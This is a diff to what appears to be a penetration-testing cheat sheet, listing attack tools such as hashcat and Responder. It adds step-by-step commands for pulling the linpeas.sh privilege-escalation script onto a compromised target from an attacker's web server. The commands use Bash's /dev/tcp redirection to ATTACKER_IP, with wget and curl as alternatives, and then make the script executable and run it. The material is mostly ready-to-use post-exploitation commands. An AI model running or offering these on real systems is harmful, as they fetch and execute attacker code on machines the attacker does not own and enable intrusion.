@@ -29,11 +29,29 @@
 | [hashcat](https://hashcat.net/hashcat/) | GPU password cracker | `sudo apt install hashcat` |
 | [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS poisoner | `git clone` |
 
-
-
-Alternative method to fetch and run linpeas.sh when common tools (curl/wget/nc) are unavailable on the target — using Bash’s /dev/tcp:
+1. Bash /dev/tcp Method (No Tools Required) 
+If bash (version 2.04+) is installed and compiled with –enable-net-redirections (standard on most Linux), you can use bash built-ins to open a TCP connection to an attacker's HTTP server. 
+Attacker Machine:
+```bash
+# Serve file from current directory
+python3 -m http.server 80
 ```
-
-( exec 3<>/dev/tcp/IP/PORT; printf 'GET /test HTTP/1.1\r\nHost: IP:PORT\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh
-
+Target Machine:
+```bash
+( exec 3<>/dev/tcp/ATTACKER_IP/80; printf 'GET /linpeas.sh HTTP/1.1\r\nHost: ATTACKER_IP\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+2. Python SimpleHTTPServer (Standard) 
+If Python is available on the attacker machine, this is the most common method. 
+Attacker Machine:
+```bash
+python3 -m http.server 80
+```
+Target Machine (using available tool):
+```bash
+# Option A: wget
+wget http://ATTACKER_IP/linpeas.sh
+# Option B: curl
+curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh
 ```
